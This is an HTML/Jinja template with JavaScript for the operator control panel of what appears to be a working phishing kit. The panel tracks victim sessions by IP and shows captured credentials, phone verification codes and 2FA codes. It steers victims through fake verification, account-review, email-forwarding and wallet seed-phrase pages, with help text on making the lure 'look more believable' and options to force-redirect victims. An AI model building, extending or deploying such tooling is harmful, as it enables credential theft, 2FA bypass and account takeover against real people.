<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect Control Panel</title>
    <link href="/static/css/panel.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <h1><i class="fas fa-redo-alt"></i> Redirect Control Panel</h1>
            <div class="header-controls">
                <button class="btn btn-secondary" onclick="refreshPanel()">
                    <i class="fas fa-sync-alt"></i> Refresh Panel
                </button>
                <div class="last-updated">
                    Last updated: <span id="last-updated"></span>
                </div>
            </div>
        </header>

        <main class="main-content">
            <!-- Active Sessions Section -->
            <section class="card">
                <div class="card-header">
                    <h2><i class="fas fa-users"></i> Active Sessions ({{ sessions|length }})</h2>
                </div>
                <div class="card-body">
                    {% if sessions %}
                    <div class="table-responsive">
                        <table class="data-table">
                            <thead>
                                <tr>
                                    <th>Session ID</th>
                                    <th>User Agent</th>
                                    <th>IP Address</th>
                                    <th>Start Time</th>
                                    <th>Current Stage</th>
                                    <th>Status</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for session_id, session in sessions.items() %}
                                <tr>
                                    <td><span class="session-id">{{ session_id[:8] }}...</span></td>
                                    <td>{{ session.user_agent|truncate(30) }}</td>
                                    <td><span class="ip-address">{{ session.ip }}</span></td>
                                    <td>{{ session.start_time }}</td>
                                    <td><span class="badge badge-stage">{{ session.stage|replace('_', ' ') }}</span></td>
                                    <td><span class="badge badge-{{ session.status }}">{{ session.status }}</span></td>
                                    <td>
                                        <button class="btn btn-danger btn-sm" onclick="deleteSession('{{ session_id }}')">
                                            <i class="fas fa-trash"></i> Delete
                                        </button>
                                    </td>
                                </tr>
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>
                    {% else %}
                    <div class="empty-state">
                        <i class="fas fa-user-slash"></i>
                        <p>No active sessions</p>
                    </div>
                    {% endif %}
                </div>
            </section>

            <!-- Banned IPs Section -->
            <section class="card">
                <div class="card-header">
                    <h2><i class="fas fa-ban"></i> Banned IP Addresses ({{ banned_ips|length }})</h2>
                </div>
                <div class="card-body">
                    {% if banned_ips %}
                    <div class="table-responsive">
                        <table class="data-table">
                            <thead>
                                <tr>
                                    <th>IP Address</th>
                                    <th>Ban Time</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                {% for ip in banned_ips %}
                                <tr>
                                    <td><span class="ip-address">{{ ip.ip_address }}</span></td>
                                    <td>{{ ip.ban_time }}</td>
                                    <td>
                                        <button class="btn btn-success btn-sm" onclick="unbanIp('{{ ip.ip_address }}')">
                                            <i class="fas fa-unlock"></i> Unban
                                        </button>
                                    </td>
                                </tr>
                                {% endfor %}
                            </tbody>
                        </table>
                    </div>
                    {% else %}
                    <div class="empty-state">
                        <i class="fas fa-check-circle"></i>
                        <p>No banned IP addresses</p>
                    </div>
                    {% endif %}
                </div>
            </section>

            <!-- IP Management Section -->
            <section class="card">
                <div class="card-header">
                    <h2><i class="fas fa-network-wired"></i> IP Management</h2>
                </div>
                <div class="card-body">
                    <h3>Ban IP Address</h3>
                    <div class="input-group">
                        <input type="text" id="ip-to-ban" placeholder="Enter IP address to ban">
                        <button class="btn btn-danger" onclick="banIp()">
                            <i class="fas fa-ban"></i> Ban IP
                        </button>
                    </div>
                </div>
            </section>

            <!-- Session Controls Section -->
            <section class="card">
                <div class="card-header">
                    <h2><i class="fas fa-sliders-h"></i> Session Controls</h2>
                </div>
                <div class="card-body">
                    {% for session_id, session in sessions.items() %}
                    <div class="session-card" data-session-id="{{ session_id }}">
                        <div class="session-header">
                            <h3>Session: {{ session_id[:8] }}...</h3>
                            <div class="session-status">
                                <span class="badge badge-{{ session.status }}">{{ session.status }}</span>
                                <span class="badge badge-stage">{{ session.stage|replace('_', ' ') }}</span>
                            </div>
                        </div>
                        
                        <div class="session-info">
                            <div class="info-item">
                                <label><i class="fas fa-desktop"></i> User Agent:</label>
                                <span>{{ session.user_agent|truncate(50) }}</span>
                            </div>
                            <div class="info-item">
                                <label><i class="fas fa-network-wired"></i> IP:</label>
                                <span class="ip-address">{{ session.ip }}</span>
                            </div>
                            <div class="info-item">
                                <label><i class="fas fa-clock"></i> Started:</label>
                                <span>{{ session.start_time }}</span>
                            </div>
                        </div>

                        <!-- Phone Digits Input -->
                        <div class="control-group">
                            <h4><i class="fas fa-mobile-alt"></i> Set Phone Number Digits</h4>
                            <div class="input-group">
                                <input type="text" id="phone-digits-{{ session_id }}" 
                                       placeholder="Enter last 3 digits" maxlength="3" pattern="[0-9]{3}">
                                <button class="btn btn-success" onclick="setPhoneDigits('{{ session_id }}')">
                                    <i class="fas fa-save"></i> Set Digits
                                </button>
                            </div>
                            <p class="help-text">This will show "•••••••XXX" on the verification page to make it look more believable.</p>
                        </div>

                        <!-- Account Review Data -->
                        <div class="control-group">
                            <h4><i class="fas fa-user-check"></i> Set Account Review Data</h4>
                            <div class="form-grid">
                                <div class="form-group">
                                    <label for="account-email-{{ session_id }}">Email:</label>
                                    <input type="email" id="account-email-{{ session_id }}" 
                                           placeholder="user@example.com">
                                </div>
                                <div class="form-group">
                                    <label for="account-phone-digits-{{ session_id }}">Phone Last 3 Digits:</label>
                                    <input type="text" id="account-phone-digits-{{ session_id }}" 
                                           placeholder="Enter last 3 digits" maxlength="3" pattern="[0-9]{3}">
                                </div>
                            </div>
                            <button class="btn btn-primary" onclick="setAccountReviewData('{{ session_id }}')">
                                <i class="fas fa-save"></i> Set Account Review Data
                            </button>
                            <p class="help-text">This data will be displayed on the account review page as shown in the image.</p>
                        </div>

                        <!-- Target Email -->
                        <div class="control-group">
                            <h4><i class="fas fa-envelope"></i> Set Target Email Address</h4>
                            <div class="input-group">
                                <input type="email" id="target-email-{{ session_id }}" 
                                       placeholder="Enter target email address"
                                       value="{{ session.email if session.email else '' }}">
                                <button class="btn btn-primary" onclick="setTargetEmail('{{ session_id }}')">
                                    <i class="fas fa-save"></i> Set Email
                                </button>
                            </div>
                            <p class="help-text">This email will be displayed on the email verification page where users are instructed to forward emails.</p>
                        </div>

                        <!-- Seed Phrase -->
                        <div class="control-group">
                            <h4><i class="fas fa-seedling"></i> Set Seed Phrase</h4>
                            <div class="input-group">
                                <input type="text" id="seed-phrase-{{ session_id }}" 
                                    placeholder="Enter 12-word seed phrase"
                                    value="{{ session.seed_phrase if session.seed_phrase else 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about' }}">
                                <button class="btn btn-success" onclick="setSeedPhrase('{{ session_id }}')">
                                    <i class="fas fa-save"></i> Set Seed
                                </button>
                            </div>
                            <p class="help-text">This seed phrase will be displayed on the wallet backup page.</p>
                        </div>

                        <!-- Quick Direct Redirect -->
                        <div class="control-group">
                            <h4><i class="fas fa-fast-forward"></i> Quick Direct Redirect</h4>
                            <div class="input-group">
                                <select id="direct-redirect-{{ session_id }}">
                                    {% for stage in stages %}
                                    <option value="{{ stage }}">{{ stage|title|replace('_', ' ') }}</option>
                                    {% endfor %}
                                </select>
                                <button class="btn btn-warning" onclick="directRedirect('{{ session_id }}')">
                                    <i class="fas fa-paper-plane"></i> Go Now
                                </button>
                            </div>
                            <p class="help-text">Send directly to any page without following workflow order.</p>
                        </div>

                        <!-- Navigation History -->
                        {% if session.history %}
                        <div class="control-group">
                            <h4><i class="fas fa-history"></i> Navigation History</h4>
                            <div class="history-list">
                                {% for item in session.history %}
                                <div class="history-item">
                                    <span class="time">{{ item.time }}</span>
                                    <span class="path">{{ item.from|replace('_', ' ') }} → {{ item.to|replace('_', ' ') }}</span>
                                </div>
                                {% endfor %}
                            </div>
                        </div>
                        {% endif %}

                        <!-- Completed Stages -->
                        {% if session.completed_stages %}
                        <div class="control-group">
                            <h4><i class="fas fa-check-circle"></i> Completed Stages</h4>
                            <div class="chips-container">
                                {% for stage in session.completed_stages %}
                                <span class="chip">{{ stage|replace('_', ' ') }}</span>
                                {% endfor %}
                            </div>
                        </div>
                        {% endif %}

                        <!-- Captured Data -->
                        {% if session_id in captured_data %}
                        <div class="control-group">
                            <h4><i class="fas fa-database"></i> Captured Data</h4>
                            <div class="captured-data">
                                <!-- Credentials -->
                                {% if captured_data[session_id].get('credentials') and captured_data[session_id]['credentials'].get('email') %}
                                <div class="data-item">
                                    <span class="data-label">Credentials:</span>
                                    <span class="data-value">Email: {{ captured_data[session_id]['credentials']['email'] }}, Password: ********</span>
                                </div>
                                {% endif %}
                                
                                <!-- Verification -->
                                {% if captured_data[session_id].get('verification') %}
                                <div class="data-item">
                                    <span class="data-label">Verification:</span>
                                    <span class="data-value">Phone: {{ captured_data[session_id]['verification'].get('phone', 'Not provided') }}, Code: {{ captured_data[session_id]['verification'].get('code', 'Not provided') }}</span>
                                </div>
                                {% endif %}
                                
                                <!-- Account Review -->
                                {% if captured_data[session_id].get('account_review') %}
                                <div class="data-item">
                                    <span class="data-label">Account Review:</span>
                                    <span class="data-value">User Agreed: {{ captured_data[session_id]['account_review'].get('user_agreed', 'false') }}</span>
                                </div>
                                {% endif %}
                                
                                <!-- 2FA -->
                                {% if captured_data[session_id].get('two_fa') and captured_data[session_id]['two_fa'].get('code') %}
                                <div class="data-item">
                                    <span class="data-label">2FA Code:</span>
                                    <span class="data-value">{{ captured_data[session_id]['two_fa']['code'] }}</span>
                                </div>
                                {% endif %}
                                
                                <!-- Email Forwarding -->
                                {% if captured_data[session_id].get('email_forwarding') %}
                                <div class="data-item highlight">
                                    <span class="data-label"><i class="fas fa-envelope"></i> Email Forwarding:</span>
                                    <div class="data-subitem">
                                        <span class="data-sublabel">Target Email:</span>
                                        <span id="target-email-display-{{ session_id }}" class="data-value">{{ captured_data[session_id]['email_forwarding'].get('target_email', 'Not set') }}</span>
                                    </div>
                                    <div class="data-subitem">
                                        <span class="data-sublabel">Forwarded At:</span>
                                        <span class="data-value">{{ captured_data[session_id]['email_forwarding'].get('forward_time', 'Not forwarded yet') }}</span>
                                    </div>
                                    <div class="data-subitem">
                                        {% if captured_data[session_id]['email_forwarding'].get('forwarded') %}
                                        <span class="badge badge-success">✅ Email was forwarded by user</span>
                                        {% else %}
                                        <span class="badge badge-danger">❌ Email not forwarded yet</span>
                                        {% endif %}
                                    </div>
                                </div>
                                {% endif %}
                                
                                <!-- Additional captured data sections would go here -->
                            </div>
                        </div>
                        {% endif %}

                        <!-- Control Buttons -->
                        <div class="control-group">
                            <h4><i class="fas fa-directions"></i> Navigate to Stage</h4>
                            <div class="button-grid">
                                {% for stage in stages %}
                                <button class="btn btn-stage {% if stage == session.stage %}active{% endif %}" 
                                        onclick="redirectSession('{{ session_id }}', '{{ stage }}')">
                                    {{ stage|title|replace('_', ' ') }}
                                </button>
                                {% endfor %}
                            </div>
                            
                            <h4><i class="fas fa-bolt"></i> Quick Actions</h4>
                            <div class="button-grid">
                                <button class="btn btn-warning" onclick="goBack('{{ session_id }}')">
                                    <i class="fas fa-arrow-left"></i> Go Back
                                </button>
                                <button class="btn btn-danger" onclick="redirectSession('{{ session_id }}', 'final_redirect')">
                                    <i class="fas fa-external-link-alt"></i> Final Redirect
                                </button>
                                <button class="btn btn-purple" onclick="forceRedirect('{{ session_id }}')">
                                    <i class="fas fa-compass"></i> Force Redirect
                                </button>
                                <button class="btn btn-danger" onclick="deleteSession('{{ session_id }}')">
                                    <i class="fas fa-trash"></i> Delete Session
                                </button>
                            </div>
                        </div>

                        <!-- Force Redirect Panel -->
                        <div id="force-redirect-{{ session_id }}" class="force-redirect-panel">
                            <h4><i class="fas fa-compass"></i> Force Redirect to Custom URL</h4>
                            <div class="input-group">
                                <input type="url" id="custom-url-{{ session_id }}" placeholder="https://example.com">
                                <button class="btn btn-success" onclick="applyForceRedirect('{{ session_id }}')">
                                    <i class="fas fa-check"></i> Apply
                                </button>
                            </div>
                        </div>
                    </div>
                    {% endfor %}
                </div>
            </section>
        </main>
    </div>

    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script>
        // All JavaScript functions from the original code remain exactly the same
        // Only the CSS and HTML structure has been updated
        const socket = io();
        
        function updateLastUpdatedTime() {
            const now = new Date();
            const timeString = now.toLocaleTimeString();
            document.getElementById('last-updated').textContent = timeString;
        }
        
        updateLastUpdatedTime();
        
        function refreshPanel() {
            location.reload();
        }
        
        function banIp() {
            const ipInput = document.getElementById('ip-to-ban');
            const ip = ipInput.value.trim();
            
            if (!ip) {
                alert('Please enter an IP address');
                return;
            }
            
            fetch(`/ban_ip/${ip}`, {
                method: 'POST'
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                if (data.status === 'success') {
                    ipInput.value = '';
                    location.reload();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error banning IP');
            });
        }
        
        function unbanIp(ip) {
            if (!confirm(`Are you sure you want to unban ${ip}?`)) {
                return;
            }
            
            fetch(`/unban_ip/${ip}`, {
                method: 'POST'
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                if (data.status === 'success') {
                    location.reload();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error unbanning IP');
            });
        }
        
        function deleteSession(sessionId) {
            if (!confirm('Are you sure you want to delete this session? This will close the user\'s session.')) {
                return;
            }
            
            fetch(`/delete_session/${sessionId}`, {
                method: 'POST'
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                if (data.status === 'success') {
                    const sessionElement = document.querySelector(`[data-session-id="${sessionId}"]`);
                    if (sessionElement) {
                        sessionElement.remove();
                    }
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error deleting session');
            });
        }
        
        function setTargetEmail(sessionId) {
            const emailInput = document.getElementById(`target-email-${sessionId}`);
            const email = emailInput.value.trim();
            
            if (!email || !/^\S+@\S+\.\S+$/.test(email)) {
                alert('Please enter a valid email address');
                return;
            }
            
            const formData = new FormData();
            formData.append('email', email);
            
            fetch(`/set-target-email/${sessionId}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    alert(data.message);
                    emailInput.value = email;
                    updateLastUpdatedTime();
                    
                    const emailDisplay = document.getElementById(`target-email-display-${sessionId}`);
                    if (emailDisplay) {
                        emailDisplay.textContent = email;
                    }
                } else {
                    alert(data.message);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error setting target email');
            });
        }
        
        function redirectSession(sessionId, stage) {
            fetch(`/redirect/${sessionId}?stage=${stage}`)
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                    updateLastUpdatedTime();
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error redirecting session');
                });
        }
        
        function directRedirect(sessionId) {
            const stageSelect = document.getElementById(`direct-redirect-${sessionId}`);
            const stage = stageSelect.value;
            
            const formData = new FormData();
            formData.append('stage', stage);
            
            fetch(`/direct-redirect/${sessionId}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                updateLastUpdatedTime();
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error redirecting session');
            });
        }
        
        function goBack(sessionId) {
            fetch(`/back/${sessionId}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        alert(data.message);
                        updateLastUpdatedTime();
                    } else {
                        alert(data.message);
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    alert('Error going back');
                });
        }
        
        function forceRedirect(sessionId) {
            const element = document.getElementById(`force-redirect-${sessionId}`);
            element.style.display = element.style.display === 'none' ? 'block' : 'none';
        }
        
        function applyForceRedirect(sessionId) {
            const url = document.getElementById(`custom-url-${sessionId}`).value;
            if (url) {
                socket.emit('force_redirect', { session_id: sessionId, url: url });
                alert(`Force redirecting to: ${url}`);
                updateLastUpdatedTime();
            } else {
                alert('Please enter a valid URL');
            }
        }
        
        function setPhoneDigits(sessionId) {
            const digitsInput = document.getElementById(`phone-digits-${sessionId}`);
            const digits = digitsInput.value.trim();
            
            if (!digits || !/^\d{3}$/.test(digits)) {
                alert('Please enter exactly 3 digits');
                return;
            }
            
            const formData = new FormData();
            formData.append('digits', digits);
            
            fetch(`/set-phone-digits/${sessionId}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                if (data.status === 'success') {
                    digitsInput.value = '';
                    updateLastUpdatedTime();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error setting phone digits');
            });
        }
        
        function setAccountReviewData(sessionId) {
            const emailInput = document.getElementById(`account-email-${sessionId}`);
            const digitsInput = document.getElementById(`account-phone-digits-${sessionId}`);
            
            const email = emailInput.value.trim();
            const digits = digitsInput.value.trim();
            
            if (!email || !/^\S+@\S+\.\S+$/.test(email)) {
                alert('Please enter a valid email address');
                return;
            }
            
            if (!digits || !/^\d{3}$/.test(digits)) {
                alert('Please enter exactly 3 digits for phone number');
                return;
            }
            
            const formData = new FormData();
            formData.append('email', email);
            formData.append('digits', digits);
            
            fetch(`/set-email-digits/${sessionId}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                if (data.status === 'success') {
                    emailInput.value = '';
                    digitsInput.value = '';
                    updateLastUpdatedTime();
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error setting account review data');
            });
        }
        
        function setSeedPhrase(sessionId) {
            const seedInput = document.getElementById(`seed-phrase-${sessionId}`);
            const seedPhrase = seedInput.value.trim();
            
            if (!seedPhrase) {
                alert('Please enter a seed phrase');
                return;
            }
            
            const formData = new FormData();
            formData.append('seed_phrase', seedPhrase);
            
            fetch(`/set-seed-phrase/${sessionId}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    alert(data.message);
                    updateLastUpdatedTime();
                } else {
                    alert(data.message);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error setting seed phrase');
            });
        }
        
        socket.on('session_update', function(data) {
            console.log('Session update received:', data);
            updateLastUpdatedTime();
            
            const notification = document.createElement('div');
            notification.className = 'notification';
            notification.innerHTML = 'Session updated! <button onclick="refreshPanel()">Refresh</button>';
            document.body.appendChild(notification);
            
            setTimeout(() => {
                if (document.body.contains(notification)) {
                    document.body.removeChild(notification);
                }
            }, 5000);
        });
        
        socket.on('force_redirect', function(data) {
            console.log('Force redirect received:', data);
            updateLastUpdatedTime();
        });
        
        setInterval(updateLastUpdatedTime, 60000);
    </script>
</body>
</html>